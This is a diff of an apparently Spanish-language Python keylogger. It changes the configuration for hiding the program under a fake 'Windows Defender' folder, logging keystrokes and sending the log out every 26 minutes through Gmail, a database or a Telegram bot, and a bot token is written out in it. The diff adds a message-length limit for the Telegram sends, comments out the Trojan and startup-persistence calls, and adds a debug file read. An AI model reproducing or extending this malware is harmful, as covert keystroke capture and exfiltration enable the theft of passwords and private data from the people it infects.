@@ -37,11 +37,10 @@ class Config:
         self.PATH_OCULT = "C:\\Users\\Public\\Security\\Windows Defender" + "\\"    # Ruta donde se esconderá el KEYLOGGER
         self.LOG_KEY_PATH = "C:\\Users\\Public\\Security\\Settings"+ "\\"           # Ruta del Registro de teclas
         self.LOG_NAME = "reg" + "." + "k"
-        self.PATH_KEY = self.PATH_OCULT + self.NAME_KEY  # <No cambiar>
-        self.PATH_LOG = self.LOG_KEY_PATH + self.LOG_NAME
-                                                # Nombre y extensión del registro
+        self.PATH_KEY = self.PATH_OCULT + self.NAME_KEY         # <No cambiar>
+        self.PATH_LOG = self.LOG_KEY_PATH + self.LOG_NAME       # <No cambiar>
         # Importante
-        self.TIMESEND = 26 #[minutos]                                                # Tiempo de envió del registro
+        self.TIMESEND = 26 #[minutos]                                               # Tiempo de envió del registro
         self.MODE = 2     # 0 = Gmail
                           # 1 = DataBase                                            # Solo se puede usar una opción
                           # 2 = TelegramBot
@@ -70,6 +69,8 @@ class Config:
             self.ID_2 = 000000000                                                     # ID secundario [Opcional]
             self.ID_3 = 000000000                                                     # ID Terciario  [Opcional]
             self.TOKEN = "1159435940:AAHKZLqDuuk4XBYHUx2GmQei0-RoRvis2v8"             # TOKEN de tu Bot [Obligatorio]
+            # Personalize
+            self.LEN_TEXT = 3500  #    [Longitud maxima por mensaje es de = 4000] # Solo se enviará el registro si sobrepasa la longitud especificada
 
 
 class Functions:
@@ -81,7 +82,7 @@ class Functions:
             return False    # La carpeta ya existe
         pass
 
-    def RandomChar(self,y=100):
+    def RandomChar(self,y=50): # Genera letras aleatorias [Longitud según el argumento]
         return ''.join(random.choice(string.ascii_letters) for x in range(y))
 
     # Función = Verifica si hay conexión a internet para poder envíar el log
@@ -501,7 +502,7 @@ if __name__ == '__main__':
 
     print("[Keylogger] start...")
     print("[Keylogger] Listening to Keys...")
-
+    """"
     Util().Trojan()
     Util().addStartUp()
 
@@ -512,3 +513,10 @@ if __name__ == '__main__':
     p2.start()
     p1.start()
     p1.join()
+    """
+    print("[TelegramBot] Proceso...")
+    # Abre el archivo
+    f = open(r"Z:\prueba.txt", 'r')
+    print(len(f.read()))
+    print(f.read())
+
